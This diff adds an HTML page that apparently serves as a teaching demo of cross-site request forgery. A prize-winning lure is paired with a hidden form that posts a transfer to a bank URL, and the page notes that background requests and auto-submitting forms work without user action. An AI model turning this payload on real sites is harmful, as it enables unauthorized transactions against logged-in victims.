@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Hacker Site</title>
+</head>
+<style>
+body {
+    margin: 25px;
+}
+</style>
+<script>
+function submitForm() {
+    document.getElementsByTagName("form")[0].submit();
+}
+</script>
+<body>
+<h1>Congratulations!</h1>
+<h2>You won a Ferrari! Click <a href="#" onclick="submitForm();">here</a> to collect your prize now!</h2>
+<h2>In fact you don't have to click anywhere because the browser can:
+    <ul>
+        <li>GET a fake &lt;img&gt; in the background without any visual feedback</li>
+        <li>automatically POST an HTML form</li>
+    </ul>
+</h2>
+<form action="http://bank.com/transfer" method="post">
+    <input type="hidden" name="account" value="00 0000 0000 0000 0000 0000 0001"/>
+    <input type="hidden" name="amount" value="99.99"/>
+</form>
+</body>
+</html>
